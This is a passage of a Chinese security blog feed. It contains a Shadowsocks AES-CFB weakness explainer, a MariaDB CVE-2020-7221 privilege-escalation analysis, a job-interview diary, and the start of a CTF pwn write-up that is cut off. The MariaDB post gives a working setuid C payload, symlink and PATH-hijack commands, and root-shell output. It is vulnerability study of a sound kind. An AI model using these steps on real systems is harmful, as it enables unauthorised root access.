    <link href="https://github.com/Cracke-S-J/2020/03/25/%E6%B5%85%E8%B0%88ss%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://github.com/Cracke-S-J/2020/03/25/%E6%B5%85%E8%B0%88ss%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-25T05:29:08.000Z</published>
    <updated>2020-03-25T06:18:09.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="CFB-加密模式"><a href="#CFB-加密模式" class="headerlink" title="CFB 加密模式"></a>CFB 加密模式</h3><p>在此复习一下我们小学二年级学过的密码学知识。（在此安利一下 B 站 <a href="https://space.bilibili.com/456606920" target="_blank" rel="noopener">小学生Vita君</a>，没有恰饭，很可爱的小孩）</p><p>比如 AES-256-CFB，它是一种流式加密而不是分组加密，不会直接将明文进行 AES 操作，而是 xor(明文, AES(密文))。</p><p>由此可以得出以下三个结论：</p><ol><li>CFB 的加密和解密函数是一样的，因为最后一步是 xor，连续加密两遍就是本身。</li><li>密文的某个 byte 被篡改后，解密出来的该 byte 是错的，第 N+1 个block也是错的，其他数据都是正确的。</li><li>在给定的 key 和 iv 下，cfb 的每个 block 退化为普通的 xor，已知某段明文和和对应的密文时，可以算出使用的 xor_key，从而可以对该段明文密文进行伪造。这个很重要，因为这样就可以 qiang 你了（滑稽</li></ol><h3 id="ss-整体工作流程"><a href="#ss-整体工作流程" class="headerlink" title="ss 整体工作流程"></a>ss 整体工作流程</h3><p>浏览器用 socks5 代理，将数据包发给 sslocal，sslocal 加密，发给 ssserver，ssserver 解密数据，访问指定资源，返回加密的数据，sslocal 再解密，将数据返回给浏览器。</p><p>加密和解密主要是下面那样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密</span></span><br><span class="line">data = sock5Header + httpRequest</span><br><span class="line">rand_iv + AES-cfb(key, rand_iv, data)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">httpResponse = AES-cfb(key, rand_iv2, recv_data)</span><br></pre></td></tr></table></figure><p>看起来攻击者知道 rand_iv1 和 rand_iv2，但是不知道 key，不能整体解密。</p><h2 id="Case1-解密-http-返回包"><a href="#Case1-解密-http-返回包" class="headerlink" title="Case1 解密 http 返回包"></a>Case1 解密 http 返回包</h2><p>从 ssserver 来的返回包，加密包的第一个 block 是可以猜到的，是 HTTP/1.1，所以 key[:8] 可以算出来了，然后我们就拥有了伪造前 8 个字节的能力。可能给它发送到指定端口来监听。</p><h2 id="Case2-解密指定-domain-的-httpRequest包"><a href="#Case2-解密指定-domain-的-httpRequest包" class="headerlink" title="Case2 解密指定 domain 的 httpRequest包"></a>Case2 解密指定 domain 的 httpRequest包</h2><p>由于 requests 包的前几个字节是<code>0x1 ip port</code>，猜起来比较困难，所以我们只能在它 domain 表式的情况下<code>0x03 + domain_len + domain + port</code>，猜个这个，然后也可以改掉。</p><h2 id="Case3-确认-https-流量是否属于某个域名"><a href="#Case3-确认-https-流量是否属于某个域名" class="headerlink" title="Case3 确认 https 流量是否属于某个域名"></a>Case3 确认 https 流量是否属于某个域名</h2><p>在 https 的情况下，我们什么都看不到了，只知道它是个包，但是无所谓，用 Case2 的方法猜到域名就 ok，然后直接封掉你（误。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/LeadroyaL/ss-redirect-vuln-exp">https://github.com/LeadroyaL/ss-redirect-vuln-exp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;h3 id=&quot;CFB-加密模式&quot;&gt;&lt;a href=&quot;#CFB-加密模式&quot; class=&quot;headerlink&quot; title=&quot;C
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
  </entry>
  
  <entry>
    <title>MariaDB (CVE-2020-7221) 提权漏洞分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/24/mariadb%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/03/24/mariadb%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-03-24T13:21:37.000Z</published>
    <updated>2020-03-31T07:15:33.805Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。在存储引擎方面，使用XtraDB（英语：XtraDB）来代替MySQL的InnoDB。 MariaDB由MySQL的创始人Michael Widenius（英语：Michael Widenius）主导开发，他早前曾以10亿美元的价格，将自己创建的公司MySQL AB卖给了SUN，此后，随着SUN被甲骨文收购，MySQL的所有权也落入Oracle的手中。MariaDB名称来自Michael Widenius的女儿Maria的名字。</p><p>——摘自百度百科</p></blockquote><p>反正我冇听说过，但是通过分析这个 CVE，我发现 CVE 也不都是那种高大上的 Linux Kernel 二进制漏洞，或者通用组件那种协议逻辑漏洞，可能就一个 jio 本写的有问题，就能实现提权。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>趁晚上没人、Nightly 还没开始跑，上公司 server 折腾一把。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mariadb:10.4.8</span><br><span class="line">docker run -it 2ef19234ff46 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点在这个 jio 本 <code>find / -name &quot;mysql_install_db&quot;</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果设置了 --user 进入这里</span></span><br><span class="line">481 <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">"<span class="variable">$user</span>"</span></span><br><span class="line">482 <span class="keyword">then</span></span><br><span class="line">483   chown <span class="variable">$user</span> <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span> &amp;&amp; \</span><br><span class="line">484   chmod 0700 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span></span><br><span class="line">485   <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">486   <span class="keyword">then</span></span><br><span class="line">487       <span class="built_in">echo</span> <span class="string">"Cannot change ownership of the '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir' directory"</span></span><br><span class="line">488       <span class="built_in">echo</span> <span class="string">" to the '<span class="variable">$user</span>' user. Check that you have the necessary permissions and try again."</span></span><br><span class="line">489       <span class="built_in">exit</span> 1</span><br><span class="line">490   <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 如果没有设置 --srcdir 进入这里</span></span><br><span class="line">491   <span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">"<span class="variable">$srcdir</span>"</span></span><br><span class="line">492   <span class="keyword">then</span></span><br><span class="line">493     chown 0 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span> &amp;&amp; \</span><br><span class="line">494     chmod 04755 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span></span><br><span class="line">495     <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">496     <span class="keyword">then</span></span><br><span class="line">497         <span class="built_in">echo</span> <span class="string">"Couldn't set an owner to '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool'."</span></span><br><span class="line">498         <span class="built_in">echo</span> <span class="string">" It must be root, the PAM authentication plugin doesn't work otherwise.."</span></span><br><span class="line">499         <span class="built_in">echo</span></span><br><span class="line">500     <span class="keyword">fi</span></span><br><span class="line">501   <span class="keyword">fi</span></span><br><span class="line">502   args=<span class="string">"<span class="variable">$args</span> --user=<span class="variable">$user</span>"</span></span><br><span class="line">503 <span class="keyword">fi</span></span><br><span class="line">504</span><br><span class="line">505 <span class="keyword">if</span> <span class="built_in">test</span> -f <span class="string">"<span class="variable">$ldata</span>/mysql/user.frm"</span></span><br><span class="line">506 <span class="keyword">then</span></span><br><span class="line">507     <span class="built_in">echo</span> <span class="string">"mysql.user table already exists!"</span></span><br><span class="line">508     <span class="built_in">echo</span> <span class="string">"Run mysql_upgrade, not mysql_install_db"</span></span><br><span class="line">509     <span class="built_in">exit</span> 0</span><br><span class="line">510 <span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><code>chmod 04755 &quot;$pamtooldir/auth_pam_tool_dir/auth_pam_tool&quot;</code></p><p>主要是这句话，0 的意思是所有权是 root，4 是设置 suid 当用户执行它的时候，用临时拥有文件所有者权利。</p><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。简而言之用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有了这个点就很容易利用它来提权了，写一个下面这个东西来替换<code>auth_pam_tool</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">"ps"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我装的环境可能已经加上补丁了，对目录没有读权限了，现在把它恢复到有漏洞的情况，就是有读和执行权限。我的环境，我也没有删除权限啊….</p><p>切到 root 把这些操作完了，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># ll</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 1 mysql root 4096 Mar 24 14:58 ./</span><br><span class="line">drwxr-xr-x 1 root  root 4096 Oct 31 23:00 ../</span><br><span class="line">lrwxrwxrwx 1 root  root   13 Mar 24 14:58 auth_pam_tool_dir -&gt; /home/ssj/exp*</span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># export PATH=.:$PATH</span></span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># ln -s /bin/bash ps</span></span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># mysql_install_db --user=mysql</span></span><br><span class="line">chown: cannot access <span class="string">'/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool'</span>: No such file or directory</span><br><span class="line">Couldn<span class="string">'t set an owner to '</span>/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool<span class="string">'.</span></span><br><span class="line"><span class="string"> It must be root, the PAM authentication plugin doesn'</span>t work otherwise..</span><br><span class="line"></span><br><span class="line">Installing MariaDB/MySQL system tables <span class="keyword">in</span> <span class="string">'/var/lib/mysql'</span> ...</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>然后，见证奇迹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssj@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir$ ll</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 1 mysql root 4096 Mar 24 15:11 ./</span><br><span class="line">drwxr-xr-x 1 root  root 4096 Oct 31 23:00 ../</span><br><span class="line">lrwxrwxrwx 1 root  root   13 Mar 24 14:58 auth_pam_tool -&gt; /home/ssj/exp*</span><br><span class="line">lrwxrwxrwx 1 root  root    9 Mar 24 14:59 ps -&gt; /bin/bash*</span><br><span class="line">ssj@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir$ ./auth_pam_tool</span><br><span class="line">root@07adfd3a9460:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>哈哈哈，分析完毕。</p><h2 id="重点在这"><a href="#重点在这" class="headerlink" title="重点在这"></a>重点在这</h2><p>我刚反应过来为啥啥啥都不行了，因为应该用 mysql 那个用户，不是我随便建的呜呜呜。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ rm auto_pam_tool</span><br><span class="line">rm: cannot remove <span class="string">'auto_pam_tool'</span>: No such file or directory</span><br><span class="line">$ rm auth_pam_tool</span><br><span class="line">rm: remove write-protected regular file <span class="string">'auth_pam_tool'</span>? y</span><br><span class="line">$ ln -s /tmp/exp auth_pam_tool</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:24 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">$ ln -s /bin/bash ps</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:25 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    9 Mar 24 15:25 ps -&gt; /bin/bash</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>切到 root 执行<code>mysql_install_db --user=mysql</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># su mysql</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ ./auth_pam_tool</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>嘤嘤嘤，可以了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可 MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。在存储引擎方面，使用XtraDB（英语：XtraDB）来代
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>2020 春招面试经历</title>
    <link href="https://github.com/Cracke-S-J/2020/03/23/2020%E6%98%A5%E6%8B%9B%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/"/>
    <id>https://github.com/Cracke-S-J/2020/03/23/2020%E6%98%A5%E6%8B%9B%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</id>
    <published>2020-03-23T08:06:53.000Z</published>
    <updated>2020-04-02T08:37:58.750Z</updated>
    
    <content type="html"><![CDATA[<p>乘着春招的车海投了一把，投递顺序是 字节跳动、华为、阿里、360，都是走的内推。</p><h2 id="字节跳动"><a href="#字节跳动" class="headerlink" title="字节跳动"></a>字节跳动</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>半夜投的，第二天下午 HR 小姐姐就来电话了，聊下了实习时间，项目经历，并问大三是否继续实习，我（疯狂点头）：嗯嗯嗯，如果你们要我，我肯定会留下。HR 小姐姐：你这么优秀我们一定要你的。（嘤嘤嘤还是小姐姐好，臭男人没一个好东西）。然后电话结束鹏哥就告诉我简历评估通过了，并且转到了 有机会转正 那边。</p><h3 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h3><p>啊啊啊啊，3-29，提前一天约的面试，巨几紧张，觉得什么都要看，什么都没看（最后果然是这样，哪里不会考哪里）。</p><h4 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h4><p>小哥哥没开摄像头，听起来声音挺年轻（？或许是我的错觉）。</p><ul><li>自我介绍，（背了熟练（并不））的台词。</li><li>看你的兴趣爱好喜欢分析 CVE 是吗，讲两个。<ul><li>这个没有认真看嘤嘤嘤，妈的不该写到简历上的，角落里也逃不过。</li></ul></li><li>分析过什么 app，讲两个。<ul><li>微信抢红包，支付宝，小游戏，Xposed 呜啦呜啦……</li></ul></li><li>Android 渗透流程讲一下<ul><li>努力回想梆梆渗透的事情，强行回答。</li></ul></li><li>我看你打类 ACM 竞赛是吧，讲一下<ul><li>我高中 oier（骄傲（个P））</li></ul></li><li>我看信息安全竞赛取得了不错的成绩，是什么比赛<ul><li>是 CTF</li></ul></li><li>噢是 CTF，我没打过 CTF ，听他们说呜啦呜啦，讲两道印象深刻的题？<ul><li>我是负责 pwn 和逆向的，pwn 就是！#￥@#&amp;%#……讲了一道水题。</li></ul></li><li>听起来好水噢，再讲一道有点难度的？<ul><li>我，fmt、、堆、堆、堆</li></ul></li><li>讲一下 double free 怎么利用？<ul><li>我，比如 fastbin，呜啦呜啦。</li></ul></li><li>讲一下 libc malloc/free 流程，相关代码看过吗？<ul><li>看过看过，就，昂大循环，操作系统吧拉拉一通吹。</li></ul></li><li>好，我们来写一道算法题，冒泡排序。<ul><li>（一分钟写完，是看不起劳姿）（不能这么说，也不知道是谁连连败在字节的算法上）</li></ul></li><li>好，最后一个问题，你说的 https 证书校验问题，具体怎么做呢？<ul><li>比如抖音，它的校验做的就不好。</li></ul></li><li>woccc?（劈里啪啦键盘声），是最新版吗？<ul><li>不是不是，去年夏天发现的。</li></ul></li><li>还有发现别的抖音漏洞吗？<ul><li>没了没了。</li></ul></li></ul><h4 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h4><p>跟一面小哥哥还没聊完，小哥哥就掉线了，我还不明所以地拨了回去….结果没接，然后二面来了，是一个信号极差、面相凶恶的大叔。</p><ul><li>你是 ssj 是吧，虫洞漏洞了解过吗？自我 hook？梆梆的xxx技术是怎么实现的？玄武实验室听说过？<ul><li>呜呜呜没有。只有玄武实验室听说过。</li></ul></li><li>不要紧，说一下 Android 渗透测试流程。<ul><li>（把上一面说的又说了一遍）</li></ul></li><li>WebView 了解吗，问了一堆细节。<ul><li>大概或许可能我？？？</li></ul></li><li>content provider？zip 压缩漏洞？Janus？<ul><li>呜呜呜我怎么什么都不会。</li></ul></li><li>Android 抓包抓不到怎么办？端口暴露有问题怎么办？<ul><li>（一通乱说）</li></ul></li><li>Xposed hook 父类方法？hook 抽象类？hook 接口？你怎么去找它的子类？<ul><li>呜呜呜。（后来查了一下，当时都蒙对了）</li></ul></li><li>我这边也没有太多问题，你平常都不上课吗？逃课吗？<ul><li>我周末会写作业的嘤嘤嘤。</li></ul></li><li>一会儿 12 点给你三面。<ul><li>好的好的，谢谢谢谢。</li></ul></li></ul><p>二面结束后我觉得我没了。没想到又来个三面。</p><h4 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h4><p>一个慈祥的大叔，以至我不能判断他是技术面还是别的面。</p><ul><li>ssj 是吧，先自我介绍一下。<ul><li>我叫 ssj……</li></ul></li><li>初中接触编程具体是怎样的呢。<ul><li>打游戏，写外挂。</li></ul></li><li>Android 渗透流程。<ul><li>（第三遍回答）</li></ul></li><li>csrf 和 ssrf<ul><li>奶奶我不会啊（一通乱说）</li></ul></li><li>内网渗透无回显？<ul><li>我真的不会了。时间延迟？？</li></ul></li><li>答对了一半（woc 这个大大真好，这都能蒙对一半），逻辑漏洞说一下，下面这个场景，我要获取通讯录做好友匹配，有什么问题吗？<ul><li>（一通乱说）呜呜呜</li></ul></li><li>嗯嗯还行，最后再考你一个，调试方面的，怎么打断点找明文。<ul><li>啊啊啊不知道。</li></ul></li><li>提示 tcp 的 send？<ul><li>还是不知道，害，要是这里能答好就不至于凉。</li></ul></li><li>打印函数栈啊。<ul><li>woc 对对对，我是傻逼。</li></ul></li><li>然后我改了一下，现在调用栈里没有明文了，是怎么回事。<ul><li>嘤嘤嘤，不知道。</li></ul></li><li>两个线程一个加密一个传输。<ul><li>woccc 我是傻逼。</li></ul></li><li>“今天先面到这里，有进一步的面试 hr 会和你进行沟通”，拜拜。<ul><li>拜拜（可能真的拜拜了）</li></ul></li></ul><p>总体感觉一面可能还行，二三面没法看，但是都给到三面了呜呜呜。自己做过的项目一定要讲清楚，组织好语言，支支唔唔地跟傻逼一样。</p><h2 id="阿里巴巴"><a href="#阿里巴巴" class="headerlink" title="阿里巴巴"></a>阿里巴巴</h2><h3 id="测评"><a href="#测评" class="headerlink" title="测评"></a>测评</h3><p>3 月 18 号春招实习生第一天投的，当天做了测评，发现自己真是个憨批。前三部分每题都有精确到秒，我真是慌的一匹。</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>阅读文字提取观点题（？），类似高考语文的第一大题，什么数学、哲学、经济学、音乐、生物化学啥的都有。gg</p><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>图表计算题，怪我没准备好手机计算器，算不出来，算出来了也没时间选了….gg</p><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>图形找规律题，有的是真的看不出来，有的还是可以看出来的，唉，合着就测智商。</p><h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><p>性格测试，这部分轻松一些了，没有了时间限制，就跟着自己感觉答，也不知道我最后是个什么性格。</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><p>3 月 23 号上午 10 点一个声音粗壮的大哥打来电话，约下午两点面试，紧张的一匹，准备了一上午基础知识，然后都没问！一个都没！……</p><p>大哥（姑且叫大哥，毕竟到最后我都不知道这位大哥尊姓大名）：ssj，先自我介绍一下。</p><p>我：（提前准备好的自我介绍，照着念）我叫 ssj……</p><p>大哥：你是上课实习还是假期实习。</p><p>我：（开始狡辩）</p><p>大哥：就是逃课呗，是不是逃课。</p><p>我：我我我我我，是逃课。</p><p>大哥：说一下你目前的工作。</p><p>我：啦啦啦（妈的）</p><p>大哥：open64，等我查下，昂，是个编译器。说下梆梆的工作，你们混淆怎么做的，你主要做什么工作。</p><p>我：我我我我（我是弟弟）</p><p>大哥：分析过 CVE 吗，讲一下。</p><p>我：前两天调了一个 linux kernen double free 的。</p><p>大哥：调过了吗，遇到过什么问题，利用思路讲一下。</p><p>我：这是一个条件竞争造成的伪 double free，主要是…（主要是 tm 我也讲不清，一通胡扯）。</p><p>大哥：智能合约漏洞讲一下。</p><p>我：重入 巴拉巴拉小魔仙。</p><p>大哥：好，我大致了解你的情况了，我是阿里云的，这边做什么安全的都有，漏洞挖掘，物联网，你还有什么要问的吗。</p><p>我：宁看我还有哪不行，我去学（呜呜呜我哪都不行）</p><p>大哥：你逆向还行，CVE 分析的不够，实战太少。</p><p>我：呜呜呜知道了。</p><p>大哥：&amp;……%@#*&amp;（我没听懂）</p><p>…………长达 2 秒的漫长寂静</p><p>大哥：喂？</p><p>我：在呢在呢</p><p>大哥：没事我挂了，再见。</p><p>我：再见再见。</p><p>然后 tmd 我就没了。阿里拜拜。</p><p>然后我上校招网上看，tmd 城市居然变灰了，变灰了，了，了，了了。然后疯狂百度谷歌了一把城市变灰是什么意思，最后得出结论好像没有什么意思……只是简历被部门锁定了，进入流程了。</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><p>拉进了一个群，然后简历邮件收到了回复。</p><h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><p>用了之前跟我聊过的那个 HR 的内推码投的，明晚做笔试加油加油。</p><h3 id="3-15-统一非技术笔试"><a href="#3-15-统一非技术笔试" class="headerlink" title="3-15 统一非技术笔试"></a>3-15 统一非技术笔试</h3><p>开摄像头把秃头打在公屏上，哭哭。</p><ol><li>图形找规律，能找到的不多，哭哭。</li><li>简单的数学逻辑题，这个还 ok。</li><li>语文高考题，成语、病句、句子排序，哭哭。</li><li>图表计算题，算死我了，计算器戳戳戳。</li></ol><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;乘着春招的车海投了一把，投递顺序是 字节跳动、华为、阿里、360，都是走的内推。&lt;/p&gt;
&lt;h2 id=&quot;字节跳动&quot;&gt;&lt;a href=&quot;#字节跳动&quot; class=&quot;headerlink&quot; title=&quot;字节跳动&quot;&gt;&lt;/a&gt;字节跳动&lt;/h2&gt;&lt;h3 id=&quot;前奏&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="面试体验" scheme="https://github.com/Cracke-S-J/categories/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/"/>
    
      <category term="安全" scheme="https://github.com/Cracke-S-J/categories/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="面试体验" scheme="https://github.com/Cracke-S-J/tags/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/"/>
    
      <category term="安全" scheme="https://github.com/Cracke-S-J/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Search Engine 分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/21/search-engine%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/03/21/search-engine%E5%88%86%E6%9E%90/</id>
    <published>2020-03-21T06:25:59.000Z</published>
    <updated>2020-03-31T14:45:25.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br></pre></td></tr></table></figure><p>这个程序有两种选择，1 对应如下，输入了一个 word，很好，完全不知道在索引什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 